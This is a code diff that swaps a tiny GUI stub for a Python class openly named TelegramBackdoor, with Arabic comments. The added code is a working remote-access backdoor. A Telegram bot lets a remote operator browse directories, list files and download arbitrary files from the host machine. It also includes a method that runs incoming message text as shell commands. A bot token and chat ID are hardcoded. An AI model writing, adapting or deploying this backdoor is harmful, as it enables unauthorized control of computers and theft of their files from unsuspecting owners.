@@ -1,15 +1,70 @@
-import flet as ft
-def main(page:ft.Page):
-    page.window.width=800
-    page.window.height=700
-    page.window.left=300
-    page.window.top=10
-    page.theme_mode=ft.ThemeMode.SYSTEM
-    page.add(
-        ft.Row([ft.Text("Wlecome M.r Hcaker",size="50",color=ft.colors.BLACK87)],ft.MainAxisAlignment.CENTER),
-        ft.Row([ft.TextField(label="Enter ip address",icon=ft.icons.ADD_REACTION_SHARP,width=400,color=ft.colors.WHITE,text_size='20',bgcolor=ft.colors.BLUE_ACCENT_700,border_radius=20)],ft.MainAxisAlignment.CENTER),
-    )
-    page.update()
+from telegram import Update
+from telegram.ext import Application, CommandHandler, CallbackContext
+import os
+import subprocess
 
-ft.app(target=main)
-    
+class TelegramBackdoor:
+    def __init__(self, bot_token, chat_id):
+        self.bot_token = bot_token
+        self.chat_id = chat_id
+        self.application = Application.builder().token(bot_token).build()
+
+        # تعريف الأوامر
+        self.application.add_handler(CommandHandler("cd", self.change_directory))
+        self.application.add_handler(CommandHandler("ls", self.list_files))
+        self.application.add_handler(CommandHandler("pwd", self.get_current_directory))
+        self.application.add_handler(CommandHandler("download", self.download_file))
+        self.application.add_handler(CommandHandler("exit", self.exit))
+
+        # بدء البوت
+        self.application.run_polling()
+
+    async def run_command(self, update: Update, context: CallbackContext):
+        command = update.message.text
+        try:
+            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+            await update.message.reply_text(f"Result:\n{result}")
+        except Exception as ex:
+            await update.message.reply_text(f"Error: {str(ex)}")
+
+    async def send_message(self, update: Update, message: str):
+        await update.message.reply_text(message)
+
+    async def send_file(self, update: Update, file_path: str):
+        with open(file_path, "rb") as f:
+            await update.message.reply_document(document=f)
+
+    async def change_directory(self, update: Update, context: CallbackContext):
+        path = ' '.join(context.args)
+        try:
+            os.chdir(path)
+            await self.send_message(update, f"Changed directory to {os.getcwd()}")
+        except Exception as e:
+            await self.send_message(update, f"Error: {str(e)}")
+
+    async def list_files(self, update: Update, context: CallbackContext):
+        try:
+            files = "\n".join(os.listdir())
+            await self.send_message(update, f"Files in current directory:\n{files}")
+        except Exception as e:
+            await self.send_message(update, f"Error: {str(e)}")
+
+    async def get_current_directory(self, update: Update, context: CallbackContext):
+        await self.send_message(update, f"Current directory: {os.getcwd()}")
+
+    async def download_file(self, update: Update, context: CallbackContext):
+        file = ' '.join(context.args)
+        try:
+            await self.send_file(update, file)
+        except Exception as e:
+            await self.send_message(update, f"Error downloading {file}: {str(e)}")
+
+    async def exit(self, update: Update, context: CallbackContext):
+        await self.send_message(update, "Exiting...")
+        self.application.stop()
+
+# إدخال بيانات البوت
+if __name__ == "__main__":
+    BOT_TOKEN = "8112064545:AAEMf4FgOsCQk6VLWY8FcMFSZhYoVEBdbjM"
+    CHAT_ID = "'7840869740'"
+    TelegramBackdoor(BOT_TOKEN, CHAT_ID)
